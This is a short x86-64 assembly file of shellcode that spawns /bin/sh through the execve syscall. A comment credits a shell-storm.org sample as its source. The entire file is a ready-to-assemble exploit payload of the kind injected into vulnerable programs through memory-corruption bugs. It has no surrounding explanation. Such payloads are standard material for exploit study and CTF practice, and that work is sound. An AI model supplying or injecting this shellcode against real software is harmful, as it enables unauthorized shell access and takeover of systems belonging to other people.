; execve("/bin/sh", NULL, NULL), based off of shellcode from http://shell-storm.org/shellcode/files/shellcode-603.php
[SECTION .text]
global _start
_start:
	mov rdi, 0x0068732f6e69622f
	push rdi
	push rsp
	pop rdi
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
